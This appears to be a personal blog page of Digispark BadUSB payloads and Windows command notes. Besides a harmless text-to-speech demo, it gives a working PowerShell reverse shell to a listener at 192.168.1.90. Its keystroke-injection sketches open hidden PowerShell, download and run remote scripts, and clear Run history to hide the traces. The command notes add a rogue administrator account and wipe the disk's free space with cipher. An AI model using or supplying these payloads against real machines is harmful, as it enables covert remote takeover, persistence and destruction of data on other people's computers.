---
title: "Payloads digispark"
author: Ludovic COULON
date: 2020-04-12
hero: ./images/hero.jpeg
excerpt: "Payloads digispark"
---

## Payloads generator for Windows/Linux/Mac

[Duck ToolKit](https://ducktoolkit.com/payload/windows#)

[CedArctic/DigiSpark-Scripts](https://github.com/CedArctic/DigiSpark-Scripts)

[Introduction](https://xapax.gitbooks.io/security/)

[thewhiteh4t/flashsploit](https://github.com/thewhiteh4t/flashsploit)

## Convert DuckyScripts > Digispark

[Duckuino](https://d4n5h.github.io/Duckuino/)

## All the payloads that just works 👍

**Say something on command line ශ**

# Tell something with command line interface 🎭

```arduino
#include "DigiKeyboard.h"
void setup() {
	DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("Add-Type -AssemblyName System.speech");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$speak.Speak(\"hello from digispark.\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N);
}

void loop() {
}
```

**Create administrator account 𝌒**
**Reverse shell windows ＼**

# Reverse shell on windows 🤡

## First, on the host attacker machine create a php server and upload the payload

```php
# Start the php server
sudo php -S 0.0.0.0:80 -t /Users/zeeph/Desktop/
```

```powershell
# Create a file called payload.ps1
$client=New-Object System.Net.Sockets.TCPClient('192.168.1.90',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
$sm=(New-Object Net.Sockets.TCPClient('192.168.1.90',1234)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

![https://i.imgur.com/QMC7DVO.png](https://i.imgur.com/QMC7DVO.png)

```bash
# Listen all the tcp connexion on port 1234
ncat -nvlp [PORT]

# Shell spawner linux only !
python -c 'import pty; pty.spawn("/bin/sh")'
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e76316ca-186c-47fe-be6c-e5f77dd03b2f/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e76316ca-186c-47fe-be6c-e5f77dd03b2f/Untitled.png)

```arduino
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.90/payload.ps1');\"");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"");
}

void loop() {
}
```

**Python script with digispark ⚆**

```arduino
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell -windowstyle hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("$source = \"http://192.168.1.90/payload.py\"; $destination = \"C:/Documents\"; Invoke-WebRequest $source -OutFile $destination;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("python C:/Documents/payload.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
void loop() {
}
```

## Useful commands

**Windows commands ̐**

# **CMD - Windows commands**

The equivalent to the Linux command `;` as in

```
echo "command 1" ; echo "command 2"
```

is

```
dir & whoami
```

### **Dealing with files and stuff**

**Delete file**

```
del
```

**Create folder/directory**

```
md folderName
```

**Show hidden files**

```
dir /A
```

**Print out file content, like cat**

```
type file.txt
```

**grep files**

```
findstr file.txt
```

### **Network**

**Show network information**

```bash
netstat -an
```

**Show network adapter info**

```bash
ipconfig
```

**Ping another machine**

```bash
ping 192.168.1.101
```

**Traceroute**

```bash
tracert
```

### **Processes**

**List processes**

```bash
tasklist
```

**Kill a process**

```bash
taskkill /PID 1532 /F
```

### **Users**

```
net users

# Add user
net user hacker my_password /add
net localgroup Administrator hacker /add

# Check if you are part of a domain
net localgroup /domain

# List all users in a domain
net users /domain
```

### **Other**

**Shutdown**

```
# Shutdown now
shutdown /s /t 0

# Restart
shutdown /r /t 0
```

**ciper - Clear data/shred**

```
Shreds the whole machine
ciper /w:C:\
```
